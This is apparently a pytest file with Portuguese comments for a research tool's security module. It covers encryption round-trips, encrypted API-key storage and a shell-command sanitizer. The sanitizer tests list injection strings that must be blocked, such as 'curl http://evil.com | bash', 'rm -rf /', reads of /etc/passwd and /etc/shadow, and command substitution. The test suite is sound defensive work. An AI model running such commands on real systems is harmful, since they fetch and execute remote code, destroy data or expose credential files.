"""Testes para security.py — criptografia e sanitizacao de comandos.

Cobre 4 areas:
  1. Criptografia Fernet (round-trip, fallback, HMAC, chave errada)
  2. _FernetFallback (XOR/AES fallback sem cryptography)
  3. Gerenciamento de chaves no Drive (save/load, migracao old->new)
  4. Sanitizacao de comandos (20+ vetores de command injection)
"""

import os
import sys
import json
import base64

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from pesquisai.security import (
    generate_key,
    encrypt_data,
    decrypt_data,
    sanitize_command,
    _check_injection,
    save_encrypted_keys,
    load_encrypted_keys,
    _get_keyfile_path,
    _get_keysfile_path,
    _load_or_create_encryption_key,
    ALLOWED_COMMAND_PREFIXES,
    MAX_COMMAND_LENGTH,
    KEYS_FILENAME,
    KEYFILE_FILENAME,
)


# ═══════════════════════════════════════════════════════════════
# 1. CRIPTOGRAFIA
# ═══════════════════════════════════════════════════════════════

class TestCryptoRoundTrip:
    """Ciclo encrypt -> decrypt deve preservar o original."""

    def test_roundtrip_simple(self):
        key = generate_key()
        plaintext = "sk-ant-api03-abcdef123456"
        token = encrypt_data(key, plaintext)
        assert token != plaintext
        assert decrypt_data(key, token) == plaintext

    def test_roundtrip_unicode(self):
        """Caracteres unicode (acentos, emoji) devem preservar-se."""
        key = generate_key()
        plaintext = "chave-com-acentos-e-emoji-\U0001f52c"
        token = encrypt_data(key, plaintext)
        assert decrypt_data(key, token) == plaintext

    def test_roundtrip_empty(self):
        key = generate_key()
        token = encrypt_data(key, "")
        assert decrypt_data(key, token) == ""

    def test_roundtrip_long(self):
        key = generate_key()
        plaintext = "x" * 1000
        token = encrypt_data(key, plaintext)
        assert decrypt_data(key, token) == plaintext

    def test_token_not_plaintext(self):
        key = generate_key()
        plaintext = "SECRET_KEY_12345"
        token = encrypt_data(key, plaintext)
        assert plaintext not in token

    def test_different_keys_different_tokens(self):
        k1 = generate_key()
        k2 = generate_key()
        assert k1 != k2
        plaintext = "mesma-chave-teste"
        assert encrypt_data(k1, plaintext) != encrypt_data(k2, plaintext)

    def test_decrypt_wrong_key_fails(self):
        """Chave errada nao deve decifrar o plaintext."""
        k1 = generate_key()
        k2 = generate_key()
        token = encrypt_data(k1, "secreto")
        try:
            result = decrypt_data(k2, token)
            assert result != "secreto"
        except Exception:
            pass  # esperado: levantar erro

    def test_decrypt_corrupted_token_fails(self):
        """Token modificado deve falhar na verificacao HMAC."""
        key = generate_key()
        token = encrypt_data(key, "dado-original")
        corrupted = token[:-2] + ("XX" if token[-2:] != "XX" else "YY")
        try:
            decrypt_data(key, corrupted)
        except Exception:
            pass  # esperado

    def test_decrypt_truncated_token_fails(self):
        """Token muito curto deve falhar graciosamente."""
        key = generate_key()
        try:
            decrypt_data(key, "abc")
        except Exception:
            pass  # esperado


class TestKeyGeneration:
    """Geracao de chaves."""

    def test_generate_key_returns_bytes(self):
        assert isinstance(generate_key(), bytes)

    def test_generate_key_length(self):
        key = generate_key()
        assert len(key) in (32, 44)

    def test_generate_key_unique(self):
        keys = {generate_key() for _ in range(10)}
        assert len(keys) == 10


# ═══════════════════════════════════════════════════════════════
# 2. FERNET FALLBACK
# ═══════════════════════════════════════════════════════════════

class TestFernetFallback:
    """_FernetFallback: implementacao alternativa quando cryptography ausente."""

    def test_fallback_generate_key(self):
        """_FernetFallback.generate_key deve retornar base64 de 32 bytes."""
        from pesquisai.security import _FernetFallback
        key = _FernetFallback.generate_key()
        assert isinstance(key, bytes)
        # base64 de 32 bytes = 44 chars
        assert len(key) == 44
        decoded = base64.urlsafe_b64decode(key)
        assert len(decoded) == 32

    def test_fallback_roundtrip_raw_key(self):
        """_FernetFallback com chave raw de 32 bytes deve round-trip."""
        from pesquisai.security import _FernetFallback
        import secrets
        key = secrets.token_bytes(32)
        f = _FernetFallback(key)
        data = b"teste-de-criptografia"
        token = f.encrypt(data)
        assert f.decrypt(token) == data

    def test_fallback_roundtrip_base64_key(self):
        """_FernetFallback com chave base64 (44 bytes) deve round-trip."""
        from pesquisai.security import _FernetFallback
        key = _FernetFallback.generate_key()
        f = _FernetFallback(key)
        data = b"dados-secretos-123"
        token = f.encrypt(data)
        assert f.decrypt(token) == data

    def test_fallback_roundtrip_string_key(self):
        """_FernetFallback com chave string arbitrária deve round-trip."""
        from pesquisai.security import _FernetFallback
        f = _FernetFallback("minha-chave-arbitraria")
        data = b"abc"
        token = f.encrypt(data)
        assert f.decrypt(token) == data

    def test_fallback_wrong_key_fails(self):
        """_FernetFallback com chave errada deve falhar no HMAC."""
        from pesquisai.security import _FernetFallback
        import secrets
        k1 = secrets.token_bytes(32)
        k2 = secrets.token_bytes(32)
        f1 = _FernetFallback(k1)
        f2 = _FernetFallback(k2)
        token = f1.encrypt(b"secreto")
        try:
            f2.decrypt(token)
            assert False, "Deveria falhar com chave errada"
        except (ValueError, Exception):
            pass  # esperado: HMAC invalido

    def test_fallback_corrupted_token_fails(self):
        """Token corrompido deve falhar na verificacao HMAC."""
        from pesquisai.security import _FernetFallback
        import secrets
        key = secrets.token_bytes(32)
        f = _FernetFallback(key)
        token = f.encrypt(b"original")
        # Corromper o ultimo byte (HMAC)
        corrupted = token[:-1] + bytes([token[-1] ^ 0xFF])
        try:
            f.decrypt(corrupted)
            assert False, "Deveria falhar com HMAC corrompido"
        except ValueError:
            pass  # esperado

    def test_fallback_short_token_fails(self):
        """Token muito curto (< 49 bytes) deve falhar."""
        from pesquisai.security import _FernetFallback
        import secrets
        f = _FernetFallback(secrets.token_bytes(32))
        try:
            f.decrypt(b"short")
            assert False, "Deveria falhar com token curto"
        except ValueError:
            pass  # esperado


# ═══════════════════════════════════════════════════════════════
# 3. GERENCIAMENTO DE CHAVES E MIGRACAO
# ═══════════════════════════════════════════════════════════════

class TestKeyStore:
    """save/load de chaves criptografadas em diretorio."""

    def test_save_load_roundtrip(self, tmp_path):
        keys = {
            "anthropic": "sk-ant-123",
            "openai": "sk-openai-456",
            "google": "AIzaXYZ",
            "_env_anthropic": "ANTHROPIC_API_KEY",
            "_env_openai": "OPENAI_API_KEY",
            "_env_google": "GOOGLE_API_KEY",
        }
        assert save_encrypted_keys(str(tmp_path), keys) is True
        loaded = load_encrypted_keys(str(tmp_path))
        assert loaded["anthropic"] == "sk-ant-123"
        assert loaded["openai"] == "sk-openai-456"
        assert loaded["google"] == "AIzaXYZ"
        assert loaded["_env_anthropic"] == "ANTHROPIC_API_KEY"

    def test_save_creates_files(self, tmp_path):
        save_encrypted_keys(str(tmp_path), {"anthropic": "sk-test"})
        assert os.path.exists(os.path.join(tmp_path, KEYS_FILENAME))
        assert os.path.exists(os.path.join(tmp_path, KEYFILE_FILENAME))

    def test_load_empty_dir(self, tmp_path):
        assert load_encrypted_keys(str(tmp_path)) == {}

    def test_load_missing_keyfile(self, tmp_path):
        """Se keys_store.json existe mas keyfile nao, retorna vazio."""
        with open(os.path.join(tmp_path, KEYS_FILENAME), "w") as f:
            json.dump({"anthropic": "fake"}, f)
        assert load_encrypted_keys(str(tmp_path)) == {}

    def test_save_preserves_metadata(self, tmp_path):
        keys = {"openai": "sk-abc", "_env_openai": "OPENAI_API_KEY"}
        save_encrypted_keys(str(tmp_path), keys)
        loaded = load_encrypted_keys(str(tmp_path))
        assert loaded["_env_openai"] == "OPENAI_API_KEY"
        assert loaded["openai"] == "sk-abc"

    def test_save_empty_value(self, tmp_path):
        keys = {"openai": "", "_env_openai": "OPENAI_API_KEY"}
        save_encrypted_keys(str(tmp_path), keys)
        loaded = load_encrypted_keys(str(tmp_path))
        assert loaded.get("openai", "") == ""

    def test_save_idempotent(self, tmp_path):
        keys = {"anthropic": "sk-123", "_env_anthropic": "ANTHROPIC_API_KEY"}
        assert save_encrypted_keys(str(tmp_path), keys) is True
        assert save_encrypted_keys(str(tmp_path), keys) is True
        assert load_encrypted_keys(str(tmp_path))["anthropic"] == "sk-123"


class TestPathMigration:
    """_get_keyfile_path e _get_keysfile_path com nomes antigos e novos."""

    def test_keyfile_new_name_preferred(self, tmp_path):
        """Se arquivo novo existe, retorna o novo."""
        new = os.path.join(str(tmp_path), KEYFILE_FILENAME)
        with open(new, "wb") as f:
            f.write(b"x" * 32)
        assert _get_keyfile_path(str(tmp_path)) == new

    def test_keyfile_old_name_fallback(self, tmp_path):
        """Se so o nome antigo existe, retorna o antigo."""
        old = os.path.join(str(tmp_path), ".keys_encryption_key")
        with open(old, "wb") as f:
            f.write(b"x" * 32)
        assert _get_keyfile_path(str(tmp_path)) == old

    def test_keyfile_neither_exists(self, tmp_path):
        """Se nenhum existe, retorna caminho novo (default)."""
        expected = os.path.join(str(tmp_path), KEYFILE_FILENAME)
        assert _get_keyfile_path(str(tmp_path)) == expected

    def test_keysfile_new_name_preferred(self, tmp_path):
        new = os.path.join(str(tmp_path), KEYS_FILENAME)
        with open(new, "w") as f:
            f.write("{}")
        assert _get_keysfile_path(str(tmp_path)) == new

    def test_keysfile_old_name_fallback(self, tmp_path):
        old = os.path.join(str(tmp_path), ".keys.json")
        with open(old, "w") as f:
            f.write("{}")
        assert _get_keysfile_path(str(tmp_path)) == old

    def test_keysfile_neither_exists(self, tmp_path):
        expected = os.path.join(str(tmp_path), KEYS_FILENAME)
        assert _get_keysfile_path(str(tmp_path)) == expected


class TestLoadOrCreateEncryptionKey:
    """_load_or_create_encryption_key cria ou carrega a chave mestra."""

    def test_creates_new_key(self, tmp_path):
        """Se nao existe, cria nova chave de 32 bytes."""
        key = _load_or_create_encryption_key(str(tmp_path))
        assert isinstance(key, bytes)
        assert len(key) in (32, 44)
        assert os.path.exists(os.path.join(str(tmp_path), KEYFILE_FILENAME))

    def test_loads_existing_key(self, tmp_path):
        """Se existe, carrega a mesma chave."""
        key1 = _load_or_create_encryption_key(str(tmp_path))
        key2 = _load_or_create_encryption_key(str(tmp_path))
        assert key1 == key2

    def test_key_file_permissions(self, tmp_path):
        """Arquivo de chave deve ter permissoes restritivas (0o600)."""
        _load_or_create_encryption_key(str(tmp_path))
        keyfile = os.path.join(str(tmp_path), KEYFILE_FILENAME)
        stat = os.stat(keyfile)
        # 0o600 = 384 decimal; em alguns sistemas o mode pode ter bits extra
        assert (stat.st_mode & 0o777) == 0o600 or (stat.st_mode & 0o777) == 0o644


# ═══════════════════════════════════════════════════════════════
# 4. SANITIZACAO DE COMANDOS
# ═══════════════════════════════════════════════════════════════

class TestSanitizeAllowed:
    """Comandos validos que devem passar."""

    def test_opencode_simple(self):
        ok, cmd = sanitize_command("opencode")
        assert ok and cmd == "opencode"

    def test_opencode_with_args(self):
        assert sanitize_command("opencode --help")[0]

    def test_opencode_session(self):
        assert sanitize_command("opencode -s ses_abc123")[0]

    def test_opencode_session_with_dots(self):
        assert sanitize_command("opencode -s ses.abc-123_def")[0]

    def test_export_with_and_opencode(self):
        ok, _ = sanitize_command('export OPENAI_API_KEY="sk-123" && opencode')
        assert ok

    def test_export_simple(self):
        assert sanitize_command("export PATH=/usr/bin")[0]

    def test_echo(self):
        assert sanitize_command("echo hello")[0]

    def test_ls(self):
        assert sanitize_command("ls -la")[0]

    def test_pwd(self):
        assert sanitize_command("pwd")[0]

    def test_whoami(self):
        assert sanitize_command("whoami")[0]

    def test_date(self):
        assert sanitize_command("date")[0]

    def test_env(self):
        assert sanitize_command("env")[0]

    def test_strip_whitespace(self):
        ok, cmd = sanitize_command("  opencode  ")
        assert ok and cmd == "opencode"

    def test_double_and_allowed(self):
        assert sanitize_command("opencode && echo done")[0]

    def test_opencode_s_without_id_allowed(self):
        """'opencode -s' sem id (stripped) e valido do opencode."""
        ok, _ = sanitize_command("opencode -s ")
        assert ok


class TestSanitizeInjectionBlocked:
    """Vetores de command injection que DEVEM ser bloqueados."""

    def test_semicolon_blocked(self):
        ok, err = sanitize_command("opencode; rm -rf /")
        assert not ok and ";" in err

    def test_pipe_blocked(self):
        ok, err = sanitize_command("opencode | cat")
        assert not ok

    def test_backtick_blocked(self):
        ok, err = sanitize_command("opencode `rm -rf /`")
        assert not ok

    def test_command_substitution_blocked(self):
        ok, err = sanitize_command("opencode $(whoami)")
        assert not ok and "$(" in err

    def test_parameter_expansion_blocked(self):
        ok, err = sanitize_command("opencode ${HOME}")
        assert not ok and "${" in err

    def test_redirect_out_blocked(self):
        ok, err = sanitize_command("opencode > /etc/passwd")
        assert not ok

    def test_redirect_in_blocked(self):
        ok, err = sanitize_command("opencode < /etc/shadow")
        assert not ok

    def test_newline_blocked(self):
        ok, err = sanitize_command("opencode\nrm -rf /")
        assert not ok

    def test_carriage_return_blocked(self):
        ok, err = sanitize_command("opencode\rrm -rf /")
        assert not ok

    def test_null_byte_blocked(self):
        ok, err = sanitize_command("opencode\x00rm -rf /")
        assert not ok

    def test_ampersand_isolated_blocked(self):
        ok, err = sanitize_command("opencode &")
        assert not ok

    def test_ampersand_injection_blocked(self):
        ok, err = sanitize_command("opencode & rm -rf /")
        assert not ok

    def test_semicolon_in_echo_blocked(self):
        ok, err = sanitize_command("echo hello; rm -rf /")
        assert not ok

    def test_cat_etc_passwd_blocked(self):
        ok, err = sanitize_command("cat /etc/passwd")
        assert not ok

    def test_rm_rf_blocked(self):
        ok, err = sanitize_command("rm -rf /")
        assert not ok

    def test_curl_pipe_bash_blocked(self):
        ok, err = sanitize_command("curl http://evil.com | bash")
        assert not ok

    def test_opencode_session_with_space_blocked(self):
        """'opencode -s ses abc' (espaco no id) deve ser bloqueado."""
        ok, err = sanitize_command("opencode -s ses abc")
        assert not ok

    def test_opencode_session_with_dollar_blocked(self):
        """'opencode -s $HOME' deve ser bloqueado."""
        ok, err = sanitize_command("opencode -s $HOME")
        assert not ok

    def test_python3_blocked(self):
        """Prefixo nao listado deve ser bloqueado."""
        ok, err = sanitize_command("python3 script.py")
        assert not ok

    def test_bash_blocked(self):
        ok, err = sanitize_command("bash -c 'rm -rf /'")
        assert not ok


class TestSanitizeEdgeCases:
    """Casos limite da sanitizacao."""

    def test_empty_command(self):
        ok, err = sanitize_command("")
        assert not ok and "vazio" in err.lower()

    def test_whitespace_only(self):
        ok, err = sanitize_command("   ")
        assert not ok

    def test_too_long_command(self):
        long_cmd = "opencode " + "a" * (MAX_COMMAND_LENGTH + 10)
        ok, err = sanitize_command(long_cmd)
        assert not ok

    def test_exactly_max_length(self):
        cmd = "opencode " + "a" * (MAX_COMMAND_LENGTH - len("opencode "))
        ok, _ = sanitize_command(cmd)
        assert ok

    def test_opencode_session_invalid_chars(self):
        ok, err = sanitize_command("opencode -s ses;rm")
        assert not ok

    def test_prefixes_list_not_empty(self):
        assert len(ALLOWED_COMMAND_PREFIXES) > 0
        assert "opencode" in ALLOWED_COMMAND_PREFIXES


class TestCheckInjection:
    """_check_injection diretamente."""

    def test_clean_returns_none(self):
        assert _check_injection("opencode") is None
        assert _check_injection("export VAR=1 && opencode") is None

    def test_each_blocked_detected(self):
        assert _check_injection("cmd; rm") is not None
        assert _check_injection("cmd | cat") is not None
        assert _check_injection("cmd > file") is not None
        assert _check_injection("cmd < file") is not None
        assert _check_injection("cmd `x`") is not None
        assert _check_injection("cmd $(x)") is not None
        assert _check_injection("cmd ${x}") is not None
        assert _check_injection("cmd &") is not None
        assert _check_injection("cmd\nx") is not None
        assert _check_injection("cmd\rx") is not None
        assert _check_injection("cmd\x00x") is not None

    def test_andand_allowed(self):
        assert _check_injection("cmd1 && cmd2") is None

    def test_export_with_semicolon_allowed(self):
        assert _check_injection('export X="a;b"') is None
